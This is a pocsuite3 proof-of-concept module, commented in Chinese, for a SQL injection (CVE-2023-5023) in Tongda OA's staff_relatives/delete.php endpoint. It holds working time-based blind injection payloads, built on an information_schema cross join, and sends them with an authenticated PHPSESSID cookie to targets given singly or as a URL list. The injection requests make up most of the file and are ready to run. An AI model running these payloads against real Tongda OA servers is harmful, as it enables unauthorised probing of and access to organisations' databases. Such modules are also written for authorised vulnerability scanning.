from collections import OrderedDict
from urllib.parse import urljoin
import re,random,time
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-10-11'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-10-11'  # 编写 PoC 的日期
    updateDate = '2023-10-11'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '通达OA后台SQL注入'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '通达OA'  # 漏洞应用名称
    appVersion = '''>=11.10,2017'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        近日，通达OA中一处SQL注入漏洞的细节于互联网公开，漏洞编号：CVE-2023-5023，漏洞危害等级：中危。
        通达OA 后台中存在SQL注入漏洞，由于对用户输入过滤不足，拥有系统登录权限的攻击者可以利用general/hr/manage/staff_relatives/delete.php 接口的 $RELATIVES_ID  参数执行SQL注入攻击，从而获取数据库中的敏感信息。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify --ck PHPSESSID
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _options(self):
        o = OrderedDict()
        o["ck"] = OptString(default='PHPSESSID=hrnclcqnv8hf8u8faniui2cc43',description='PHPSESSID',require=False)
        return o
    def _verify(self):
        result = {}
        path = "/general/hr/manage/staff_relatives/delete.php?RELATIVES_ID="
        payload_1 = '1) and (1=2) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1'
        payload = '1) and (1=1) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1'
        url = self.url + path

        PHPSESSID = self.get_option("ck")
        header = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'Cookie': 'PHPSESSID='+PHPSESSID+''
        }
        try:
            resq_1 = requests.get(url=url+payload_1,headers=header,timeout=100,allow_redirects=False)
            if resq_1.status_code == 302 and resq_1.elapsed.seconds <= 1:
                start_time = time.time()    # 程序开始时间  
                resq = requests.get(url=url+payload,headers=header,timeout=100,allow_redirects=False)
                end_time = time.time()    # 程序结束时间
                run_time = end_time - start_time    # 程序的运行时间，单位为秒
                if resq.status_code == 302 and run_time >=3:
                    #print(resq_windows.text)
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['POC'] = url + path
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)